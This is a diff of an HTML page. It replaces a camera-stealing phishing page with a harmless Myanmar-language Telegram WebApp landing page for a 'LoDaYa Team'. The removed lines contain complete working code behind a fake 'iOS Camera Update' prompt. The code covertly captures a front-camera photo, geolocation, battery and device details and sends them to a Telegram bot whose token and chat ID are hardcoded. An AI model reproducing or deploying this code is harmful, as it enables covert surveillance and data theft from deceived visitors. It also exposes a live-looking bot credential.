@@ -1,202 +1,356 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Camera Update</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: -apple-system, BlinkMacSystemFont, Helvetica, Arial, sans-serif;
-      background: #f4f4f7;
-      color: #000;
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>LoDaYa Team</title>
+<style>
+  /* Reset and basics */
+  * {
+    margin: 0; padding: 0; box-sizing: border-box;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  }
+  body {
+    background: #121212;
+    color: #eee;
+    min-height: 100vh;
+    display: flex; flex-direction: column;
+  }
+  /* Navbar */
+  nav {
+    background: #181818;
+    padding: 0 2rem;
+    box-shadow: 0 0 15px #03dac6;
+    height: 60px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: relative;
+    user-select: none;
+  }
+  nav .logo {
+    font-weight: 900;
+    font-size: 1.5rem;
+    color: #03dac6;
+    letter-spacing: 2px;
+  }
+
+  /* Hamburger */
+  #menuToggle {
+    display: none; /* hide by default */
+    flex-direction: column;
+    justify-content: space-around;
+    width: 30px;
+    height: 24px;
+    cursor: pointer;
+  }
+  #menuToggle div {
+    width: 30px;
+    height: 4px;
+    background: #03dac6;
+    border-radius: 2px;
+    transition: all 0.3s ease;
+    transform-origin: 1px;
+  }
+
+  /* Checkbox hack */
+  #menuCheckbox {
+    display: none;
+  }
+  #menuCheckbox:checked + #menuToggle div:nth-child(1) {
+    transform: rotate(45deg);
+  }
+  #menuCheckbox:checked + #menuToggle div:nth-child(2) {
+    opacity: 0;
+  }
+  #menuCheckbox:checked + #menuToggle div:nth-child(3) {
+    transform: rotate(-45deg);
+  }
+
+  /* Nav links */
+  nav ul {
+    list-style: none;
+    display: flex;
+    gap: 1rem;
+  }
+  nav ul li {
+    display: flex;
+    align-items: center;
+  }
+  nav ul li button {
+    background: linear-gradient(135deg, #03dac6, #00bfa5);
+    border: none;
+    padding: 0 1.4rem;
+    height: 38px;
+    border-radius: 30px;
+    font-weight: 700;
+    color: #121212;
+    cursor: pointer;
+    box-shadow: 0 5px 15px rgba(3, 218, 198, 0.6);
+    transition: all 0.25s ease;
+    position: relative;
+    overflow: hidden;
+    line-height: 1.2;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  nav ul li button::after {
+    content: '';
+    position: absolute;
+    left: 50%; top: 50%;
+    transform: translate(-50%, -50%) scale(0);
+    width: 120%; height: 120%;
+    background: rgba(255,255,255,0.15);
+    border-radius: 50%;
+    transition: transform 0.3s ease;
+  }
+  nav ul li button:hover::after {
+    transform: translate(-50%, -50%) scale(1);
+  }
+  nav ul li button:hover {
+    box-shadow: 0 7px 25px rgba(3, 218, 198, 0.85);
+    transform: translateY(-3px) scale(1.1);
+  }
+  nav ul li button:active {
+    transform: scale(0.95);
+    box-shadow: inset 0 3px 5px rgba(0,0,0,0.4);
+  }
+  nav ul li button.active-nav {
+    background: #ffffff;
+    color: #121212;
+    box-shadow: 0 0 20px #03dac6;
+  }
+
+  /* Sections */
+  .section {
+    flex-grow: 1;
+    padding: 3rem 2rem;
+    display: none;
+    max-width: 800px;
+    margin: auto;
+    user-select: none;
+  }
+  .section.active {
+    display: block;
+  }
+  /* About Section */
+  #about img {
+    width: 100%;
+    max-width: 350px;
+    border-radius: 20px;
+    box-shadow: 0 0 20px #03dac6;
+    display: block;
+    margin: 1rem auto;
+  }
+  /* List Section */
+  #list {
+    text-align: center;
+  }
+  #list button {
+    background: #222;
+    border: 2px solid #03dac6;
+    color: #03dac6;
+    padding: 0.6rem 1.5rem;
+    margin: 0.7rem;
+    font-weight: 700;
+    border-radius: 15px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+  }
+  #list button:hover {
+    background: #03dac6;
+    color: #121212;
+    box-shadow: 0 0 15px #03dac6;
+  }
+  /* Contact Section */
+  #contact {
+    text-align: center;
+  }
+  #contact button {
+    background: linear-gradient(135deg, #03dac6, #00bfa5);
+    color: #121212;
+    font-weight: 700;
+    border-radius: 25px;
+    padding: 0.7rem 1.6rem;
+    border: none;
+    margin: 1rem 0.7rem;
+    cursor: pointer;
+    box-shadow: 0 5px 15px rgba(3, 218, 198, 0.7);
+    transition: all 0.3s ease;
+  }
+  #contact button:hover {
+    box-shadow: 0 7px 25px rgba(3, 218, 198, 1);
+    transform: translateY(-3px);
+  }
+  /* Telegram Profile Card */
+  #profile .telegram-profile-card {
+    background-color: #1f1f1f;
+    padding: 2rem;
+    border-radius: 20px;
+    box-shadow: 0 0 15px #03dac6;
+    max-width: 320px;
+    margin: 2rem auto;
+    text-align: center;
+  }
+  #profile .telegram-profile-card img {
+    width: 120px;
+    height: 120px;
+    border-radius: 50%;
+    object-fit: cover;
+    margin-bottom: 1rem;
+    box-shadow: 0 0 12px #03dac6;
+  }
+  #profile .telegram-profile-card h3 {
+    margin-bottom: 0.3rem;
+    font-weight: 800;
+    font-size: 1.6rem;
+    color: #03dac6;
+  }
+  #profile .telegram-profile-card p {
+    font-size: 1rem;
+    color: #aaa;
+    margin-bottom: 0.2rem;
+  }
+  #profile .telegram-profile-card small {
+    color: #555;
+  }
+
+  /* Responsive */
+  @media (max-width: 600px) {
+    nav {
+      padding: 0 1rem;
+      height: auto;
+      flex-wrap: wrap;
+    }
+    /* Show hamburger */
+    #menuToggle {
       display: flex;
+    }
+    /* Hide nav links by default */
+    nav ul {
       flex-direction: column;
-      align-items: center;
-      padding: 40px 20px;
-      min-height: 100vh;
-      box-sizing: border-box;
-    }
-
-    h2 {
-      font-size: 22px;
-      color: #444;
-      margin-bottom: 12px;
-    }
-
-    .fake-box {
-      background: white;
-      border-radius: 16px;
-      padding: 20px;
+      position: absolute;
+      top: 60px;
+      left: 0;
       width: 100%;
-      max-width: 320px;
-      box-shadow: 0 0 12px rgba(0, 0, 0, 0.08);
-      text-align: center;
+      background: #181818;
+      box-shadow: 0 0 15px #03dac6;
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.3s ease;
+      gap: 0;
+      border-radius: 0 0 20px 20px;
+      z-index: 100;
     }
-
-    .fake-box p {
-      font-size: 15px;
-      color: #777;
-      margin-bottom: 20px;
+    /* When checked, expand menu */
+    #menuCheckbox:checked ~ ul {
+      max-height: 500px; /* Enough height to show all items */
+      padding: 1rem 0;
     }
-
-    button {
-      background-color: #007aff;
-      color: white;
-      border: none;
-      padding: 14px 28px;
-      border-radius: 12px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      width: 100%;
-      box-shadow: 0 0 14px rgba(0, 122, 255, 0.5);
+    nav ul li {
+      justify-content: center;
+      margin: 0.5rem 0;
     }
-
-    #status {
-      margin-top: 15px;
-      font-size: 14px;
-      color: #999;
-      text-align: center;
+    nav ul li button {
+      width: 90%;
+      padding: 0.6rem 0;
+      font-size: 1.1rem;
+      height: auto;
+      line-height: normal;
+      border-radius: 15px;
+      box-shadow: none;
     }
-
-    video {
-      width: 100%;
-      max-width: 320px;
-      border-radius: 12px;
-      margin-top: 20px;
-    }
-
-    canvas {
-      display: none;
-    }
-  </style>
+  }
+</style>
 </head>
 <body>
+<nav>
+  <div class="logo">LoDaYa Team</div>
 
-  <div class="fake-box">
-    <h2>📷 iOS Camera Update</h2>
-    <p>Your camera needs a quick security configuration update.</p>
-    <button id="startBtn">Start Update</button>
-    <div id="status"></div>
+  <input type="checkbox" id="menuCheckbox" />
+  <label for="menuCheckbox" id="menuToggle">
+    <div></div>
+    <div></div>
+    <div></div>
+  </label>
+
+  <ul id="nav-links">
+    <li><button class="active-nav" onclick="showSection('about')">About</button></li>
+    <li><button onclick="showSection('list')">List</button></li>
+    <li><button onclick="showSection('contact')">Contact</button></li>
+    <li><button onclick="showSection('profile')">Profile</button></li>
+  </ul>
+</nav>
+
+<!-- Sections -->
+<section id="about" class="section active">
+  <h2>LoDaYa Team ကြောင်း</h2>
+  <p>အတိတ်ကံမကောင်းတာတွေကို အပြစ်မတင်ပါနဲ့ 𝗟𝗼𝗗𝗮𝗬𝗮 နဲ့ တွေ့ရင် တစ်ပြားတစ်ချပ်မှ နစ်နာမရအောင် အမှန်အကန်သမားများစုဆောင်းပေးသော အဖွဲ့အစည်းတစ်ခုဖြစ်ပါတယ်။</p>
+  <img src="about.png" alt="LoDaYa Team Image" />
+</section>
+
+<section id="list" class="section">
+  <h2>LoDaYa ရဲ့ အကောင်းဆုံးချန်နယ်များ</h2>
+  <button onclick="window.open('http://t.me/reallistmm', '_blank')">RealListMM</button>
+  <button onclick="window.open('http://t.me/lodaya1234', '_blank')">LoDaYa1234</button>
+  <button onclick="window.open('http://t.me/Htannayyi', '_blank')">Htannayyi</button>
+</section>
+
+<section id="contact" class="section">
+  <h2>Contact Us</h2>
+  <button onclick="window.open('https://t.me/zue6670', '_blank')">Bot Owner: @zue6670</button>
+  <button onclick="window.open('https://t.me/psbh0', '_blank')">Developer: @psbh0</button>
+  <p>Developerဆီမှာ အလုပ်အပ်ချင်ပါက ဆက်သွယ်ရန်</p>
+</section>
+
+<section id="profile" class="section">
+  <h2>👤 Your Telegram Profile</h2>
+  <div class="telegram-profile-card" id="userProfile">
+    <p>Loading profile from Telegram...</p>
   </div>
+</section>
 
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas" width="320" height="240"></canvas>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script>
+  function showSection(sectionId) {
+    const sections = document.querySelectorAll('.section');
+    const navButtons = document.querySelectorAll('#nav-links button');
 
-  <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const context = canvas.getContext('2d');
-    const startBtn = document.getElementById('startBtn');
-    const statusEl = document.getElementById('status');
+    sections.forEach(s => s.classList.remove('active'));
+    document.getElementById(sectionId).classList.add('active');
 
-    const botToken = "7592072345:AAETQGV7KRpR_tZS3qd-gIZYiC1JqrTR1iM"; // ✅ Replace with your bot token
-    const chatId = "7893603597"; // ✅ Replace with your chat ID
+    navButtons.forEach(btn => btn.classList.remove('active-nav'));
+    Array.from(navButtons).find(btn => btn.textContent.toLowerCase() === sectionId).classList.add('active-nav');
 
-    async function getLocationInfo() {
-      return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-          resolve("Location: N/A");
-          return;
-        }
-
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            const { latitude, longitude } = pos.coords;
-            resolve(`Location: ${latitude.toFixed(5)}, ${longitude.toFixed(5)}`);
-          },
-          () => {
-            resolve("Location: Error");
-          },
-          { timeout: 3000 }
-        );
-      });
+    // On mobile, close menu after selection
+    const menuCheckbox = document.getElementById('menuCheckbox');
+    if(menuCheckbox.checked) {
+      menuCheckbox.checked = false;
     }
+  }
 
-    async function getDeviceDetails() {
-      const ua = navigator.userAgent;
-      const platform = navigator.platform;
-      const lang = navigator.language;
-      const date = new Date().toLocaleString();
+  window.addEventListener('DOMContentLoaded', () => {
+    const container = document.getElementById('userProfile');
+    const user = Telegram.WebApp.initDataUnsafe && Telegram.WebApp.initDataUnsafe.user;
 
-      let battery = "Battery: N/A";
-      if (navigator.getBattery) {
-        try {
-          const b = await navigator.getBattery();
-          battery = `Battery: ${Math.round(b.level * 100)}% ${b.charging ? '(Charging)' : ''}`;
-        } catch (e) {}
-      }
+    if (user) {
+      const { first_name, last_name, username, id, photo_url } = user;
 
-      const location = await getLocationInfo();
-
-      return `Time: ${date}\nLocation: ${location}\nPlatform: ${platform}\nLanguage: ${lang}\nUserAgent: ${ua}\n${battery}`;
+      container.innerHTML = `
+        <img src="${photo_url || 'https://telegra.ph/file/placeholder.jpg'}" alt="${username || 'No Username'}" />
+        <h3>${first_name || ''} ${last_name || ''}</h3>
+        <p>@${username || 'no username'}</p>
+        <p><small>ID: ${id}</small></p>
+        <a href="https://t.me/${username}" target="_blank" style="color:#03dac6; text-decoration:none; font-weight:700;">View Telegram Profile</a>
+      `;
+    } else {
+      container.innerHTML = `
+        <p>⚠️ Unable to load Telegram user data.</p>
+        <p>Make sure to open this page from the Telegram Bot WebApp button.</p>
+      `;
     }
-
-    async function captureImage(facing = "user") {
-      const constraints = {
-        video: { facingMode: { ideal: facing }, width: 320, height: 240 }
-      };
-
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        video.srcObject = stream;
-
-        await new Promise((resolve) => {
-          video.onloadedmetadata = () => {
-            video.play();
-            setTimeout(resolve, 2500); // Wait for camera to settle
-          };
-        });
-
-        canvas.width = video.videoWidth || 320;
-        canvas.height = video.videoHeight || 240;
-
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
-
-        stream.getTracks().forEach(t => t.stop());
-        return blob;
-      } catch (err) {
-        statusEl.textContent = "❌ Camera access denied or failed.";
-        throw err;
-      }
-    }
-
-    async function sendToTelegram(photoBlob, detailsText) {
-      const formData = new FormData();
-      formData.append("chat_id", chatId);
-      formData.append("photo", photoBlob, "photo.jpg");
-      formData.append("caption", `<b>📷 Front Camera Capture</b>\n\n<pre>${detailsText.replace(/</g, "&lt;")}</pre>`);
-      formData.append("parse_mode", "HTML");
-
-      try {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        });
-      } catch (e) {
-        console.error("Telegram Upload Error", e);
-      }
-    }
-
-    startBtn.addEventListener('click', async () => {
-      startBtn.disabled = true;
-      statusEl.textContent = "📸 Capturing front camera image...";
-
-      try {
-        const details = await getDeviceDetails();
-        const frontPhoto = await captureImage("user");
-        await sendToTelegram(frontPhoto, details);
-        statusEl.textContent = "✅ Camera image sent successfully.";
-      } catch (err) {
-        console.error(err);
-        statusEl.textContent = "❌ Something went wrong.";
-      } finally {
-        startBtn.disabled = false;
-      }
-    });
-  </script>
-
+  });
+</script>
 </body>
-</html>
+  </html>
